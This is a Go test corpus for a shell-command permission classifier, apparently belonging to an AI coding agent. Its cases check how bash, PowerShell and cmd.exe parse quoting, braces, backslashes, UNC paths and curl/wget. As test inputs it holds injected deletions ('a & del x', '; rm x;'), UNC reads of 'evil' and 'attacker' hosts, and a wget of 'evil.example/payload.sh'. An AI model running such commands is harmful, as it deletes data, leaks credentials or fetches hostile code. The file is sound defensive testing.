package permission

// Lines whose meaning differs between Git Bash, PowerShell and cmd.exe
// (dimension shell 种类): quote trust, PowerShell $ and braces, typographic
// quotes, bash backslashes, UNC paths, curl/wget aliases, PowerShell
// iterators. Sources: classifier_shellkind_test.go, backslash_test.go,
// classifier_unc_test.go, classifier_networking_test.go, review_fix4_test.go,
// manual 授权提示（引号内的参数）, 无法确定含义时一律询问, 命令运行在哪个 shell.

// wantFetch: a plain GET. CatSafe and auto-approved (auto mode keeps
// allowing it), but network egress, so default mode asks.
func wantFetch() permWant {
	// A read-only fetch for the classifier (CatSafe, a rememberable prefix),
	// but egress: it asks in default and auto mode alike (the manual's
	// table), since a URL or header carries whatever the shell expands.
	return permWant{auto: false, cat: CatSafe, remember: rememberPrefix, check: map[string]Decision{
		scDefault: DAsk, scAuto: DAsk, scPlan: DDeny, scBypass: DAllow,
		scAllowGo: DAsk, scDenyPush: DAllow, scAskGit: DAsk, scParamMatch: DAsk,
	}}
}

// in is a case for the given kinds.
func in(kinds []ShellKind, cmd string, w permWant, note string) permCase {
	return permCase{cmd: cmd, kinds: kinds, want: w, note: note}
}

var corpusShellKind = []permCase{
	// quoted operators: trusted under bash and PowerShell, never under cmd
	in(kPosixPS, `echo 'a & del x'`, wantReadOnly(), "引号内的 & 是参数（POSIX/PS）"),
	in(kCmd, `echo 'a & del x'`, wantAsk(u, rememberNone), "cmd 中单引号不是引号，& 会执行 del"),
	in(kPosixPS, `grep -rn "foo(" .`, wantReadOnly(), "引号内的 ( 是参数"),
	in(kCmd, `grep -rn "foo(" .`, wantAsk(u, rememberNone), "cmd 不信任引号内的操作符"),
	in(kCmd, "go test -run 'a|b' ./...", wantAsk(u, rememberNone), "cmd 下引号内的 | 是管道"),
	in(kCmd, "cd src && go test ./... && echo done", wantCmdBuild().with(scAllowGo, DAsk).rem(rememberMixed),
		"手册：cmd 回退时 cd/echo 也须被前缀覆盖，各记一个前缀"),
	in(kPosixPS, `git commit -m "fix(api): handle 429; retry"`, wantAsk(g, rememberGroup), "手册：引号内的 ; ( ) 可被 git commit 覆盖"),
	in(kCmd, `git commit -m "fix(api): handle 429; retry"`, wantAsk(u, rememberNone), "手册：cmd.exe 下保持严格"),
	in(kPosixPS, "git commit -m 'a && b'", wantAsk(g, rememberGroup), "手册：git commit -m 'a && b'"),
	in(kCmd, "git commit -m 'a && b'", wantAsk(u, rememberNone), "cmd 中 'a && b' 是两条命令"),
	in(kPosixPS, "python3 -c 'print(1)'", wantAsk(u, rememberPrefix), "解释器执行代码；引号内括号可信"),
	in(kCmd, "python3 -c 'print(1)'", wantAsk(u, rememberNone), "cmd 不信任引号内的括号"),
	in(kPosixPS, "git status && git push", wantAsk(g, rememberGroup).with(scDenyPush, DDeny), "只读 + push：只记组"),
	in(kCmd, "git status && git push", wantAsk(g, rememberMixed).with(scDenyPush, DDeny), "cmd 回退：git status 也记前缀"),
	in(kPOSIX, `echo \"; rm x; \"`, wantAsk(u, rememberPrefix), "bash 中 \\\" 是字面引号，; rm x 会执行"),
	in(kPOSIX, `echo "a\"; rm x; \"b"`, wantAsk(u, rememberNone), "引号内的 \\\" 使引号边界不可信"),

	// PowerShell: unquoted $ runs code, braces are scriptblocks, typographic
	// quotes are quotes, where/% iterate
	in(kPOSIX, `ls $HOME`, wantReadOnly(), "bash 中 $HOME 只是展开"),
	in(kPS, `ls $HOME`, wantAsk(u, rememberNone), "PowerShell 未加引号的 $ 不可信"),
	in(kCmd, `ls $HOME`, wantCmdReadOnly(), "cmd 中 $HOME 是字面文本"),
	in(kPOSIX, `echo $HOME`, wantReadOnly(), "bash echo $HOME"),
	in(kPS, `echo $HOME`, wantAsk(u, rememberNone), "PowerShell echo $HOME"),
	in(kPS, `Get-ChildItem $HOME`, wantAsk(u, rememberNone), "PowerShell 参数位置的变量"),
	in(kPS, `echo $ExecutionContext.InvokeProvider.Item.Remove('ls')`, wantAsk(u, rememberNone), "$var.Method() 在参数位置执行代码"),
	in(kPS, `git commit -m $ExecutionContext.InvokeProvider.Item.Remove('ls')`, wantAsk(u, rememberNone), "PowerShell 变量方法调用不被 git commit 覆盖"),
	in(kPOSIX, "git stash show -p stash@{0}", wantReadOnly(), "手册：bash 中 stash@{0} 是字面"),
	in(kPS, "git stash show -p stash@{0}", wantAsk(u, rememberNone), "手册：PowerShell 未加引号的花括号询问"),
	in(kCmd, "git stash show -p stash@{0}", wantAsk(u, rememberPrefix), "cmd 回退：字面花括号，询问并记前缀"),
	in(kPOSIX, "git diff HEAD@{1}", wantReadOnly(), "手册：HEAD@{1} 只读"),
	in(kPS, "git diff HEAD@{1}", wantAsk(u, rememberNone), "PowerShell 花括号"),
	in(kPOSIX, "git log @{u}..HEAD", wantReadOnly(), "手册：@{u}..HEAD 只读"),
	in(kPS, "git log @{u}..HEAD", wantAsk(u, rememberNone), "PowerShell 花括号"),
	in(kPosixPS, "ls {a,b}", wantAsk(u, rememberNone), "手册：花括号展开询问"),
	in(kCmd, "ls {a,b}", wantAsk(u, rememberPrefix), "cmd 中花括号是字面"),
	in(kPosixPS, "git log {--output=x,HEAD}", wantAsk(u, rememberNone), "花括号展开出 --output= 写文件"),
	in(kPOSIX, "echo 你好 — “quoted”", wantReadOnly(), "bash 中弯引号是普通字符"),
	in(kPS, "echo 你好 — “quoted”", wantAsk(u, rememberNone), "PowerShell 把弯引号当引号，行不可信"),
	in(kPOSIX, "where x", wantReadOnly(), "bash 中 where 是查找命令"),
	in(kPS, "where x", wantAsk(u, rememberPrefix), "PowerShell 中 where 是 Where-Object 迭代器"),
	in(kPosixCm, "find . -exec rm {} +", wantAsk(u, rememberPrefix), "find -exec 询问，可记 find 前缀"),
	in(kPS, "find . -exec rm {} +", wantAsk(u, rememberNone), "PowerShell 中 {} 是脚本块，不可记住"),
	in(kPosixCm, "find . -okdir rm {} ;", wantAsk(u, rememberPrefix), "find -okdir"),
	in(kPS, "find . -okdir rm {} ;", wantAsk(u, rememberNone), "PowerShell 花括号"),
	in(kPS, "Get-ChildItem | ForEach-Object { $_.Name }", wantAsk(u, rememberNone), "脚本块不只读"),
	in(kPS, "ls | % { rm $_ }", wantAsk(u, rememberNone), "% 迭代器"),

	// bash backslashes: continuation and quoting under POSIX only
	in(kPOSIX, "git log \\\n  --oneline -5", wantReadOnly(), "反斜杠续行连接两个无害词"),
	in(kPOSIX, "ls -la \\\n src", wantReadOnly(), "反斜杠续行"),
	in(kPOSIX, `cat \x`, wantReadOnly(), "bash 中 \\x 就是 x"),
	in(kPOSIX, "find . -f\\\nls out.txt", wantAsk(u, rememberPrefix), "bash 续行后是 find -fls 写文件"),
	in(kPOSIX, "git log --output\\\n echo", wantAsk(u, rememberPrefix), "bash 续行后是 --output 写文件"),
	in(kPOSIX, `find . -f\ls out.txt`, wantAsk(u, rememberPrefix), "bash 反斜杠转义出 -fls"),
	in(kPOSIX, `git log --out\put=x`, wantAsk(u, rememberPrefix), "bash 反斜杠转义出 --output="),
	in(kPS, `Get-Content C:\proj\a.txt`, wantReadOnly(), "PowerShell 中反斜杠是路径分隔符"),

	// UNC paths: reading another host is not a local read
	in(kPosixPS, `cat //attacker/share/x`, wantAsk(u, rememberPrefix), "UNC 正斜杠形式"),
	in(kPOSIX, `Get-Content \\evil\x`, wantAsk(u, rememberNone), "UNC 路径会带凭据访问其他主机"),
	in(kPS, `Get-Content \\evil\x`, wantAsk(u, rememberPrefix), "UNC 路径会带凭据访问其他主机"),
	in(kPOSIX, `ls \\evil\x`, wantAsk(u, rememberNone), "UNC 路径"),
	in(kPS, `ls \\evil\x`, wantAsk(u, rememberPrefix), "UNC 路径"),
	in(kPOSIX, `cat "\\evil\share\x"`, wantAsk(u, rememberNone), "引号内 UNC"),
	in(kPS, `cat "\\evil\share\x"`, wantAsk(u, rememberPrefix), "引号内 UNC"),
	in(kPosixPS, `head '//evil/share/x'`, wantAsk(u, rememberPrefix), "单引号内 UNC"),
	in(kPOSIX, `git diff --no-index a \\evil\x`, wantAsk(u, rememberNone), "git diff 读 UNC"),
	in(kPS, `git diff --no-index a \\evil\x`, wantAsk(u, rememberPrefix), "git diff 读 UNC"),
	in(kPosixPS, `grep --file=//evil/share/p x`, wantAsk(u, rememberPrefix), "--file= 值是 UNC"),
	in(kPS, `Get-Content -Path:\\host\share`, wantAsk(u, rememberPrefix), "手册：-Path:\\\\host\\share"),
	in(kPS, `Get-Content FileSystem::\\host\share`, wantAsk(u, rememberPrefix), "手册：FileSystem::\\\\host\\share"),

	// curl / wget: curl rules under bash, Invoke-WebRequest under PowerShell
	in(kPosixPS, "curl https://example.com", wantFetch(), "手册：curl GET 在 default 下也询问，auto 下放行"),
	in(kCmd, "curl https://example.com", wantAsk(CatSafe, rememberPrefix), "cmd 回退不自动放行 GET"),
	in(kPOSIX, "curl -sSfL https://example.com", wantFetch(), "curl 只读选项白名单"),
	in(kPS, "curl -sSfL https://example.com", wantAsk(u, rememberPrefix), "手册：PowerShell 下 curl 选项会被当成 Invoke-WebRequest 参数"),
	in(kPOSIX, "curl -fsSL https://example.com/install.sh -o -", wantFetch(), "-o - 是 stdout"),
	in(kPOSIX, "curl -XGET https://example.com", wantFetch(), "-XGET 粘连 GET"),
	in(kPOSIX, "curl -I https://example.com", wantFetch(), "HEAD 请求"),
	in(kPOSIX, "curl -m5 https://example.com", wantFetch(), "-m5 粘连值"),
	in(kPOSIX, "curl -H 'Accept: application/json' https://api.example.com", wantFetch(), "-H 头不是 @file"),
	in(kPOSIX, "curl https://api.example.com/x?mode=-d%20-o-", wantFetch(), "URL 里的选项文字不是选项"),
	in(kPOSIX, "wget -O - https://example.com", wantFetch(), "wget -O - 输出到 stdout"),
	in(kPOSIX, "wget -qO- https://example.com", wantFetch(), "wget -qO- 组合"),
	in(kPOSIX, "wget https://evil.example/payload.sh", wantAsk(u, rememberPrefix), "wget 默认写文件"),
	in(kPS, "wget https://evil.example/payload.sh", wantAsk(u, rememberPrefix), "pwsh 6+ 没有 wget 别名（是 GNU wget 写文件），5.1 别名读法不再升级为只读：询问"),
	in(kPS, "curl -Uri https://example.com -UseBasicParsing", wantAsk(u, rememberPrefix), "PowerShell 下 curl/wget 一律询问（别名因 pwsh 版本而异）"),
	in(kPOSIX, "curl -Uri https://example.com -UseBasicParsing", wantAsk(u, rememberPrefix), "bash 中 -Uri 是 curl 的未知选项"),
	in(kPS, "curl https://evil -Method Post -Body x", wantAsk(u, rememberPrefix), "Invoke-WebRequest POST"),
	in(kPS, "wget https://example.com -OutFile x.ps1", wantAsk(u, rememberPrefix), "-OutFile 写文件"),
	in(kPS, "curl https://a https://b", wantAsk(u, rememberPrefix), "PowerShell 只允许单个 URL"),
	in(kPosixPS, "iwr https://example.com", wantAsk(u, rememberPrefix), "手册：iwr 总是询问"),
	in(kPS, "Invoke-RestMethod https://example.com", wantAsk(u, rememberPrefix), "手册：Invoke-* 总是询问"),
	in(kPOSIX, "curl -k https://self-signed.example/", wantAsk(u, rememberPrefix), "-k 不在白名单"),
	in(kPOSIX, "curl --request=delete https://api/x", wantAsk(u, rememberPrefix), "方法必须是 GET/HEAD"),
	in(kPOSIX, "curl -so x.sh https://example.com/x.sh", wantAsk(u, rememberPrefix), "组合短选项里的 -o 文件"),
	in(kPOSIX, "wget -qO x.sh https://example.com", wantAsk(u, rememberPrefix), "wget -O 文件"),
}
